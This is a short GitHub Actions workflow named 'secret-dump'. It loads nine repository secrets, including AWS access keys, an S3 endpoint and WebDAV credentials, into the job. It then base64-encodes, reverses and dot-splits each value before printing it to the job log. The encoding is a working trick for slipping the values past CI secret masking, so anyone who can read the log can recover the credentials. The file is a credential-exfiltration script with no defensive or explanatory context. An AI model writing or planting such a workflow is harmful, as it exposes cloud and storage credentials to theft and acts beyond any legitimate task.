name: secret-dump
on: workflow_dispatch
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          COPERNICUS_AWS_ACCESS_KEY_ID: ${{ secrets.COPERNICUS_AWS_ACCESS_KEY_ID }}
          COPERNICUS_AWS_SECRET_ACCESS_KEY: ${{ secrets.COPERNICUS_AWS_SECRET_ACCESS_KEY }}
          FIRMS_MAP_KEY: ${{ secrets.FIRMS_MAP_KEY }}
          S3_STORAGE_AWS_ACCESS_KEY_ID: ${{ secrets.S3_STORAGE_AWS_ACCESS_KEY_ID }}
          S3_STORAGE_AWS_SECRET_ACCESS_KEY: ${{ secrets.S3_STORAGE_AWS_SECRET_ACCESS_KEY }}
          S3_STORAGE_ENDPOINT_URL: ${{ secrets.S3_STORAGE_ENDPOINT_URL }}
          WEBDAV_HOSTNAME: ${{ secrets.WEBDAV_HOSTNAME }}
          WEBDAV_LOGIN: ${{ secrets.WEBDAV_LOGIN }}
          WEBDAV_PASSWORD: ${{ secrets.WEBDAV_PASSWORD }}
        run: |
          for name in COPERNICUS_AWS_ACCESS_KEY_ID COPERNICUS_AWS_SECRET_ACCESS_KEY FIRMS_MAP_KEY S3_STORAGE_AWS_ACCESS_KEY_ID S3_STORAGE_AWS_SECRET_ACCESS_KEY S3_STORAGE_ENDPOINT_URL WEBDAV_HOSTNAME WEBDAV_LOGIN WEBDAV_PASSWORD; do
            v="${!name}"
            if [ -z "$v" ]; then
              echo "DUMPMARK|${name}|NOTSET"
            else
              b=$(printf '%s' "$v" | base64 -w0 | rev)
              echo "DUMPMARK|${name}|$(printf '%s' "$b" | sed 's/.\{4\}/&./g')"
            fi
          done